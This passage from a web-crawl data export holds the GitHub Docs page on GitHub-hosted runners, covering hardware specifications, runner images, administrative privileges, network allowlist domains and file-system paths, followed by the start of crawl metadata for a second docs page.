jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, see About billing for GitHub Actions.\nVirtual Machine Processor (CPU) Memory (RAM) Storage (SSD) Architecture Workflow label \nLinux\t2\t7 GB\t14 GB\tx64 \tubuntu-latest, ubuntu-24.04, ubuntu-22.04 \t\nWindows\t2\t7 GB\t14 GB\tx64 \twindows-latest, windows-2025, windows-2022, windows-2019 \t\nmacOS\t4\t14 GB\t14 GB\tIntel \tmacos-13 \t\nmacOS\t3 (M1)\t7 GB\t14 GB\tarm64 \tmacos-latest, macos-14, macos-15 \t\nWorkflow logs list the runner used to run a job. For more information, see Viewing workflow run history.\nLimitations for arm64 macOS runners\nAll actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.\nNested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.\nNetworking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.\nThe arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically 4203018E-580F-C1B5-9525-B745CECA79EB. If you are building and signing on the same host you plan to test the build on, you can sign with a development provisioning profile. If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account.\nLarger runners\nCustomers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than the standard GitHub-hosted runners. These machines are referred to as \"larger runner.\" They offer the following advanced features:\nMore RAM, CPU, and disk space\nStatic IP addresses\nAzure private networking\nThe ability to group runners\nAutoscaling to support concurrent workflows\nGPU-powered runners\nThese larger runners are hosted by GitHub and have the runner application and other tools preinstalled.\nFor more information, see Using larger runners.\nRunner Images\nGitHub maintains our own set of VM images for our standard hosted runners. This includes the images for macOS, x64 linux and Windows images. The list of images and their included tools are managed in the actions/runner-images repository. Our arm64 images are partner images, and those are managed in the actions/partner-runner-images repository.\nPreinstalled software for GitHub-owned images\nThe software tools included in our GitHub-owned images are updated weekly. The update process takes several days, and the list of preinstalled software on the main branch is updated after the whole deployment ends.\nWorkflow logs include a link to the preinstalled tools on the exact runner. To find this information in the workflow log, expand the Set up job section. Under that section, expand the Runner Image section. The link following Included Software will describe the preinstalled tools on the runner that ran the workflow.\nFor more information, see Viewing workflow run history.\nGitHub-hosted runners include the operating system's default built-in tools, in addition to the packages listed in the above references. For example, Ubuntu and macOS runners include grep, find, and which, among other default tools.\nYou can also view a software bill of materials (SBOM) for each build of the Windows and Ubuntu runner images. For more information, see Security hardening for GitHub Actions.\nUsing preinstalled software\nWe recommend using actions to interact with the software installed on runners. This approach has several benefits:\nUsually, actions provide more flexible functionality like version selection, ability to pass arguments, and parameters\nIt ensures the tool versions used in your workflow will remain the same regardless of software updates\nIf there is a tool that you'd like to request, please open an issue at actions/runner-images. This repository also contains announcements about all major software updates on runners.\nInstalling additional software\nYou can install additional software on GitHub-hosted runners. For more information, see Customizing GitHub-hosted runners.\nCloud hosts used by GitHub-hosted runners\nGitHub hosts Linux and Windows runners on virtual machines in Microsoft Azure with the GitHub Actions runner application installed. The GitHub-hosted runner application is a fork of the Azure Pipelines Agent. Inbound ICMP packets are blocked for all Azure virtual machines, so ping or traceroute commands might not work. GitHub hosts macOS runners in Azure data centers.\nWorkflow continuity\nIf GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed.\nIn addition, if the workflow run has been successfully queued, but has not been processed by a GitHub-hosted runner within 45 minutes, then the queued workflow run is discarded.\nAdministrative privileges\nThe Linux and macOS virtual machines both run using passwordless sudo. When you need to execute commands or install tools that require more privileges than the current user, you can use sudo without needing to provide a password. For more information, see the Sudo Manual.\nWindows virtual machines are configured to run as administrators with User Account Control (UAC) disabled. For more information, see How User Account Control works in the Windows documentation.\nIP addresses\nTo get a list of IP address ranges that GitHub Actions uses for GitHub-hosted runners, you can use the GitHub REST API. For more information, see the actions key in the response of the GET /meta endpoint. For more information, see REST API endpoints for meta data.\nWindows and Ubuntu runners are hosted in Azure and subsequently have the same IP address ranges as the Azure datacenters. macOS runners are hosted in GitHub's own macOS cloud.\nSince there are so many IP address ranges for GitHub-hosted runners, we do not recommend that you use these as allowlists for your internal resources. Instead, we recommend you use larger runners with a static IP address range, or self-hosted runners. For more information, see Using larger runners or About self-hosted runners.\nThe list of GitHub Actions IP addresses returned by the API is updated once a week.\nCommunication requirements for GitHub-hosted runners\nA GitHub-hosted runner must establish connections to GitHub-owned endpoints to perform essential communication operations. In addition, your runner may require access to additional networks that you specify or utilize within an action.\nTo ensure proper communications for GitHub-hosted runners between networks within your configuration, ensure that the following communications are allowed.\nNote\nSome of the domains listed are configured using CNAME records. Some firewalls might require you to add rules recursively for all CNAME records. Note that the CNAME records might change in the future, and that only the domains listed will remain constant.\nNeeded for essential operations:\nShell\ngithub.com api.github.com *.actions.githubusercontent.com \nNeeded for downloading actions:\nShell\ncodeload.github.com pkg.actions.githubusercontent.com \nNeeded for publishing immutable actions:\nNeeded for uploading/downloading job summaries, logs, workflow artifacts, and caches:\nShell\nresults-receiver.actions.githubusercontent.com *.blob.core.windows.net \nNeeded for runner version updates:\nShell\nobjects.githubusercontent.com objects-origin.githubusercontent.com github-releases.githubusercontent.com github-registry-files.githubusercontent.com \nNeeded for retrieving OIDC tokens:\nShell\n*.actions.githubusercontent.com \nNeeded for downloading or publishing packages or containers to GitHub Packages:\nShell\n*.pkg.github.com pkg-containers.githubusercontent.com ghcr.io \nNeeded for Git Large File Storage\nShell\ngithub-cloud.githubusercontent.com github-cloud.s3.amazonaws.com \nNeeded for jobs for Dependabot updates\nShell\ndependabot-actions.githubapp.com \nThe etc/hosts file\nGitHub-hosted runners are provisioned with an etc/hosts file that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk.\nFile systems\nGitHub executes actions and shell commands in specific directories on the virtual machine. The file paths on virtual machines are not static. Use the environment variables GitHub provides to construct file paths for the home, workspace, and workflow directories.\nDirectoryEnvironment variableDescription\nhome\tHOME\tContains user-related data. For example, this directory could contain credentials from a login attempt.\t\nworkspace\tGITHUB_WORKSPACE\tActions and shell commands execute in this directory. An action can modify the contents of this directory, which subsequent actions can access.\t\nworkflow/event.json\tGITHUB_EVENT_PATH\tThe POST payload of the webhook event that triggered the workflow. GitHub rewrites this each time an action executes to isolate file content between actions.\t\nFor a list of the environment variables GitHub creates for each workflow, see Store information in variables.\nDocker container filesystem\nActions that run in Docker containers have static directories under the /github path. However, we strongly recommend using the default environment variables to construct file paths in Docker containers.\nGitHub reserves the /github path prefix and creates three directories for actions.\n/github/home\n/github/workspace - Note: GitHub Actions must be run by the default Docker user (root). Ensure your Dockerfile does not set the USER instruction, otherwise you will not be able to access GITHUB_WORKSPACE.\n/github/workflow\nFurther reading\nManaging billing for GitHub Actions\nYou can use a matrix strategy to run your jobs on multiple images. For more information, see Running variations of jobs in a workflow.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-hmk17.html",
  "markdown": "# About GitHub-hosted runners - GitHub Docs\n\nGitHub offers hosted virtual machines to run workflows. The virtual machine contains an environment of tools, packages, and settings available for GitHub Actions to use.\n\n## [Overview of GitHub-hosted runners](#overview-of-github-hosted-runners)\n\nRunners are the machines that execute jobs in a GitHub Actions workflow. For example, a runner can clone your repository locally, install testing software, and then run commands that evaluate your code.\n\nGitHub provides runners that you can use to run your jobs, or you can [host your own runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners). Each GitHub-hosted runner is a new virtual machine (VM) hosted by GitHub with the runner application and other tools preinstalled, and is available with Ubuntu Linux, Windows, or macOS operating systems. When you use a GitHub-hosted runner, machine maintenance and upgrades are taken care of for you.\n\nYou can choose one of the standard GitHub-hosted runner options or, if you are on the GitHub Team or GitHub Enterprise Cloud plan, you can provision a runner with more cores, or a runner that's powered by a GPU processor. These machines are referred to as \"larger runner.\" For more information, see [About larger runners](https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/about-larger-runners/about-larger-runners).\n\nUsing GitHub-hosted runners requires network access with at least 70 kilobits per second upload and download speeds.\n\n## [Using a GitHub-hosted runner](#using-a-github-hosted-runner)\n\nTo use a GitHub-hosted runner, create a job and use `runs-on` to specify the type of runner that will process the job, such as `ubuntu-latest`, `windows-latest`, or `macos-latest`. For the full list of runner types, see [About GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners/about-github-hosted-runners#supported-runners-and-hardware-resources). If you have `repo: write` access to a repository, you can view a list of the runners available to use in workflows in the repository. For more information, see [Viewing available runners for a repository](#viewing-available-runners-for-a-repository).\n\nWhen the job begins, GitHub automatically provisions a new VM for that job. All steps in the job execute on the VM, allowing the steps in that job to share information using the runner's filesystem. You can run workflows directly on the VM or in a Docker container. When the job has finished, the VM is automatically decommissioned.\n\nThe following diagram demonstrates how two jobs in a workflow are executed on two different GitHub-hosted runners.\n\n![Diagram of a workflow that consists of two jobs. One job runs on Ubuntu and the other runs on Windows.](https://docs.github.com/assets/cb-72692/images/help/actions/overview-github-hosted-runner.png)\n\nThe following example workflow has two jobs, named `Run-npm-on-Ubuntu` and `Run-PSScriptAnalyzer-on-Windows`. When this workflow is triggered, GitHub provisions a new virtual machine for each job.\n\n*   The job named `Run-npm-on-Ubuntu` is executed on a Linux VM, because the job's `runs-on:` specifies `ubuntu-latest`.\n*   The job named `Run-PSScriptAnalyzer-on-Windows` is executed on a Windows VM, because the job's `runs-on:` specifies `windows-latest`.\n\nYAML\n\n```\nname: Run commands on different operating systems\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  Run-npm-on-Ubuntu:\n    name: Run npm on Ubuntu\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm help\n\n  Run-PSScriptAnalyzer-on-Windows:\n    name: Run PSScriptAnalyzer on Windows\n    runs-on: windows-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Get list of rules\n        shell: pwsh\n        run: |\n          Get-ScriptAnalyzerRule\n```\n\nWhile the job runs, the logs and output can be viewed in the GitHub UI:\n\n![Screenshot of a workflow run. The steps for the \"Run PSScriptAnalyzer on Windows\" job are displayed.](https://docs.github.com/assets/cb-53222/images/help/repository/actions-runner-output.png)\n\nThe GitHub Actions runner application is open source. You can contribute and file issues in the [runner](https://github.com/actions/runner) repository.\n\n## [Viewing available runners for a repository](#viewing-available-runners-for-a-repository)\n\nIf you have `repo: write` access to a repository, you can view a list of the runners available to the repository.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, under the \"Management\" section, click **Runners**.\n    \n4.  Review the list of available GitHub-hosted runners for the repository.\n    \n5.  Optionally, to copy a runner's label to use it in a workflow, click to the right of the runner, then click **Copy label**.\n    \n\nNote\n\nEnterprise and organization owners can create runners from this page. To create a new runner, click **New runner** at the top right of the list of runners to add runners to the repository.\n\nFor more information, see [Managing larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/managing-larger-runners) and [Adding self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/adding-self-hosted-runners).\n\n## [Supported runners and hardware resources](#supported-runners-and-hardware-resources)\n\nRanges of GitHub-hosted runners are available for use in public and private repositories.\n\nFor lists of available runners, see:\n\n*   [Standard runners for **public** repositories](#standard-github-hosted-runners-for-public-repositories)\n*   [Standard runners for **private** repositories](#standard-github-hosted-runners-for--private-repositories)\n\nGitHub-hosted Linux runners support hardware acceleration for Android SDK tools, which makes running Android tests much faster and consumes fewer minutes. For more information on Android hardware acceleration, see [Configure hardware acceleration for the Android Emulator](https://developer.android.com/studio/run/emulator-acceleration) in the Android Developers documentation.\n\nNote\n\nThe `-latest` runner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor.\n\nWarning\n\nBeta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support.\n\n### [Standard GitHub-hosted runners for public repositories](#standard-github-hosted-runners-for-public-repositories)\n\nFor public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited.\n\n| **Virtual Machine** | **Processor (CPU)** | **Memory (RAM)** | **Storage (SSD)** | **Architecture** | **Workflow label** |\n| --- | --- | --- | --- | --- | --- |\n| Linux | 4   | 16 GB | 14 GB | x64 | `[ubuntu-latest](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-24.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-22.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2204-Readme.md)` |\n| Windows | 4   | 16 GB | 14 GB | x64 | `[windows-latest](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2025](https://github.com/actions/runner-images/blob/main/images/windows/Windows2025-Readme.md)`, `[windows-2022](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2019](https://github.com/actions/runner-images/blob/main/images/windows/Windows2019-Readme.md)` |\n| Linux \\[Public preview\\] | 4   | 16 GB | 14 GB | arm64 | `[ubuntu-24.04-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-ubuntu-24-image.md)`, `[ubuntu-22.04-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-ubuntu-22-image.md)` |\n| Windows \\[Public preview\\] | 4   | 16 GB | 14 GB | arm64 | `[windows-11-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-windows-11-image.md)` |\n| macOS | 4   | 14 GB | 14 GB | Intel | `[macos-13](https://github.com/actions/runner-images/blob/main/images/macos/macos-13-Readme.md)` |\n| macOS | 3 (M1) | 7 GB | 14 GB | arm64 | `[macos-latest](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-14](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-15](https://github.com/actions/runner-images/blob/main/images/macos/macos-15-Readme.md)` |\n\nNote\n\nThe arm64 Linux and Windows runners are in public preview and subject to change.\n\n### [Standard GitHub-hosted runners for private repositories](#standard-github-hosted-runners-for--private-repositories)\n\nFor private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, see [About billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions#per-minute-rates).\n\n| **Virtual Machine** | **Processor (CPU)** | **Memory (RAM)** | **Storage (SSD)** | **Architecture** | **Workflow label** |\n| --- | --- | --- | --- | --- | --- |\n| Linux | 2   | 7 GB | 14 GB | x64 | `[ubuntu-latest](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-24.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-22.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2204-Readme.md)` |\n| Windows | 2   | 7 GB | 14 GB | x64 | `[windows-latest](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2025](https://github.com/actions/runner-images/blob/main/images/windows/Windows2025-Readme.md)`, `[windows-2022](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2019](https://github.com/actions/runner-images/blob/main/images/windows/Windows2019-Readme.md)` |\n| macOS | 4   | 14 GB | 14 GB | Intel | `[macos-13](https://github.com/actions/runner-images/blob/main/images/macos/macos-13-Readme.md)` |\n| macOS | 3 (M1) | 7 GB | 14 GB | arm64 | `[macos-latest](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-14](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-15](https://github.com/actions/runner-images/blob/main/images/macos/macos-15-Readme.md)` |\n\nWorkflow logs list the runner used to run a job. For more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n\n### [Limitations for arm64 macOS runners](#limitations-for-arm64-macos-runners)\n\n*   All actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.\n*   Nested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.\n*   Networking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.\n*   The arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically `4203018E-580F-C1B5-9525-B745CECA79EB`. If you are building and signing on the same host you plan to test the build on, you can sign with a [development provisioning profile](https://developer.apple.com/help/account/manage-profiles/create-a-development-provisioning-profile/). If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account.\n\n### [Larger runners](#larger-runners)\n\nCustomers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than the [standard GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-runners-and-hardware-resources). These machines are referred to as \"larger runner.\" They offer the following advanced features:\n\n*   More RAM, CPU, and disk space\n*   Static IP addresses\n*   Azure private networking\n*   The ability to group runners\n*   Autoscaling to support concurrent workflows\n*   GPU-powered runners\n\nThese larger runners are hosted by GitHub and have the runner application and other tools preinstalled.\n\nFor more information, see [Using larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-larger-runners).\n\n## [Runner Images](#runner-images)\n\nGitHub maintains our own set of VM images for our standard hosted runners. This includes the images for macOS, x64 linux and Windows images. The list of images and their included tools are managed in the [`actions/runner-images`](https://github.com/actions/runner-images) repository. Our arm64 images are partner images, and those are managed in the [`actions/partner-runner-images`](https://github.com/actions/partner-runner-images) repository.\n\n### [Preinstalled software for GitHub-owned images](#preinstalled-software-for-github-owned-images)\n\nThe software tools included in our GitHub-owned images are updated weekly. The update process takes several days, and the list of preinstalled software on the `main` branch is updated after the whole deployment ends.\n\nWorkflow logs include a link to the preinstalled tools on the exact runner. To find this information in the workflow log, expand the `Set up job` section. Under that section, expand the `Runner Image` section. The link following `Included Software` will describe the preinstalled tools on the runner that ran the workflow.\n\nFor more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n\nGitHub-hosted runners include the operating system's default built-in tools, in addition to the packages listed in the above references. For example, Ubuntu and macOS runners include `grep`, `find`, and `which`, among other default tools.\n\nYou can also view a software bill of materials (SBOM) for each build of the Windows and Ubuntu runner images. For more information, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#reviewing-the-supply-chain-for-github-hosted-runners).\n\n### [Using preinstalled software](#using-preinstalled-software)\n\nWe recommend using actions to interact with the software installed on runners. This approach has several benefits:\n\n*   Usually, actions provide more flexible functionality like version selection, ability to pass arguments, and parameters\n*   It ensures the tool versions used in your workflow will remain the same regardless of software updates\n\nIf there is a tool that you'd like to request, please open an issue at [actions/runner-images](https://github.com/actions/runner-images). This repository also contains announcements about all major software updates on runners.\n\n### [Installing additional software](#installing-additional-software)\n\nYou can install additional software on GitHub-hosted runners. For more information, see [Customizing GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners).\n\n## [Cloud hosts used by GitHub-hosted runners](#cloud-hosts-used-by-github-hosted-runners)\n\nGitHub hosts Linux and Windows runners on virtual machines in Microsoft Azure with the GitHub Actions runner application installed. The GitHub-hosted runner application is a fork of the Azure Pipelines Agent. Inbound ICMP packets are blocked for all Azure virtual machines, so ping or traceroute commands might not work. GitHub hosts macOS runners in Azure data centers.\n\n## [Workflow continuity](#workflow-continuity)\n\nIf GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed.\n\nIn addition, if the workflow run has been successfully queued, but has not been processed by a GitHub-hosted runner within 45 minutes, then the queued workflow run is discarded.\n\n## [Administrative privileges](#administrative-privileges)\n\nThe Linux and macOS virtual machines both run using passwordless `sudo`. When you need to execute commands or install tools that require more privileges than the current user, you can use `sudo` without needing to provide a password. For more information, see the [Sudo Manual](https://www.sudo.ws/man/1.8.27/sudo.man.html).\n\nWindows virtual machines are configured to run as administrators with User Account Control (UAC) disabled. For more information, see [How User Account Control works](https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works) in the Windows documentation.\n\n## [IP addresses](#ip-addresses)\n\nTo get a list of IP address ranges that GitHub Actions uses for GitHub-hosted runners, you can use the GitHub REST API. For more information, see the `actions` key in the response of the `GET /meta` endpoint. For more information, see [REST API endpoints for meta data](https://docs.github.com/en/rest/meta/meta#get-github-meta-information).\n\nWindows and Ubuntu runners are hosted in Azure and subsequently have the same IP address ranges as the Azure datacenters. macOS runners are hosted in GitHub's own macOS cloud.\n\nSince there are so many IP address ranges for GitHub-hosted runners, we do not recommend that you use these as allowlists for your internal resources. Instead, we recommend you use larger runners with a static IP address range, or self-hosted runners. For more information, see [Using larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-larger-runners) or [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).\n\nThe list of GitHub Actions IP addresses returned by the API is updated once a week.\n\n## [Communication requirements for GitHub-hosted runners](#communication-requirements-for-github-hosted-runners)\n\nA GitHub-hosted runner must establish connections to GitHub-owned endpoints to perform essential communication operations. In addition, your runner may require access to additional networks that you specify or utilize within an action.\n\nTo ensure proper communications for GitHub-hosted runners between networks within your configuration, ensure that the following communications are allowed.\n\nNote\n\nSome of the domains listed are configured using `CNAME` records. Some firewalls might require you to add rules recursively for all `CNAME` records. Note that the `CNAME` records might change in the future, and that only the domains listed will remain constant.\n\n**Needed for essential operations:**\n\nShell\n\n```\ngithub.com\napi.github.com\n*.actions.githubusercontent.com\n```\n\n**Needed for downloading actions:**\n\nShell\n\n```\ncodeload.github.com\npkg.actions.githubusercontent.com\n```\n\n**Needed for publishing immutable actions:**\n\n**Needed for uploading/downloading job summaries, logs, workflow artifacts, and caches:**\n\nShell\n\n```\nresults-receiver.actions.githubusercontent.com\n*.blob.core.windows.net\n```\n\n**Needed for runner version updates:**\n\nShell\n\n```\nobjects.githubusercontent.com\nobjects-origin.githubusercontent.com\ngithub-releases.githubusercontent.com\ngithub-registry-files.githubusercontent.com\n```\n\n**Needed for retrieving OIDC tokens:**\n\nShell\n\n```\n*.actions.githubusercontent.com\n```\n\n**Needed for downloading or publishing packages or containers to GitHub Packages:**\n\nShell\n\n```\n*.pkg.github.com\npkg-containers.githubusercontent.com\nghcr.io\n```\n\n**Needed for Git Large File Storage**\n\nShell\n\n```\ngithub-cloud.githubusercontent.com\ngithub-cloud.s3.amazonaws.com\n```\n\n**Needed for jobs for Dependabot updates**\n\nShell\n\n```\ndependabot-actions.githubapp.com\n```\n\n## [The `etc/hosts` file](#the-etchosts-file)\n\nGitHub-hosted runners are provisioned with an `etc/hosts` file that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk.\n\n## [File systems](#file-systems)\n\nGitHub executes actions and shell commands in specific directories on the virtual machine. The file paths on virtual machines are not static. Use the environment variables GitHub provides to construct file paths for the `home`, `workspace`, and `workflow` directories.\n\n| Directory | Environment variable | Description |\n| --- | --- | --- |\n| `home` | `HOME` | Contains user-related data. For example, this directory could contain credentials from a login attempt. |\n| `workspace` | `GITHUB_WORKSPACE` | Actions and shell commands execute in this directory. An action can modify the contents of this directory, which subsequent actions can access. |\n| `workflow/event.json` | `GITHUB_EVENT_PATH` | The `POST` payload of the webhook event that triggered the workflow. GitHub rewrites this each time an action executes to isolate file content between actions. |\n\nFor a list of the environment variables GitHub creates for each workflow, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables#default-environment-variables).\n\n### [Docker container filesystem](#docker-container-filesystem)\n\nActions that run in Docker containers have static directories under the `/github` path. However, we strongly recommend using the default environment variables to construct file paths in Docker containers.\n\nGitHub reserves the `/github` path prefix and creates three directories for actions.\n\n*   `/github/home`\n*   `/github/workspace` - **Note:** GitHub Actions must be run by the default Docker user (root). Ensure your Dockerfile does not set the `USER` instruction, otherwise you will not be able to access `GITHUB_WORKSPACE`.\n*   `/github/workflow`\n\n## [Further reading](#further-reading)\n\n*   [Managing billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions)\n*   You can use a matrix strategy to run your jobs on multiple images. For more information, see [Running variations of jobs in a workflow](https://docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 315,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-github-hosted-runners-about-github-hosted-runners-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 34691,
      "readableText": 31514,
      "none": 59147,
      "readableTextIfPossible": 31514,
      "result": 31514,
      "markdown": 23817
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow",
    "loadedTime": "2025-05-08T06:42:08.217Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow",
    "title": "Triggering a workflow - GitHub Docs",
    "description": "How to automatically trigger GitHub Actions workflows",
    "author": null,
    "keywords": "Workflows,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Triggering a workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
